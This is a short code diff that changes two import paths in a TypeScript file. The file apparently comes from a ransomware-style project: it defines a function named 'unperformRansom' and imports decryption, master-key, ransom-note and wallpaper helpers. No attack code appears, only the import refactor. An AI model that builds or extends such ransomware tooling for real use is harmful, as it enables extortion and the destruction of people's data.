@@ -2,14 +2,14 @@ import {
   decryptData,
   importPrivateKeyFromPem,
   unwrapSymmetricKey,
-} from "../../utils/crypto.ts";
+} from "@iw166/utils/crypto";
 import {
   getHomedir,
   getImagePath,
   getMasterkeyPath,
   getNotePath,
   runForFiles,
-} from "../../utils/path_utils.ts";
+} from "@iw166/utils/path";
 import { setBackground } from "../../utils/cmd_utils.ts";
 
 export async function unperformRansom() {
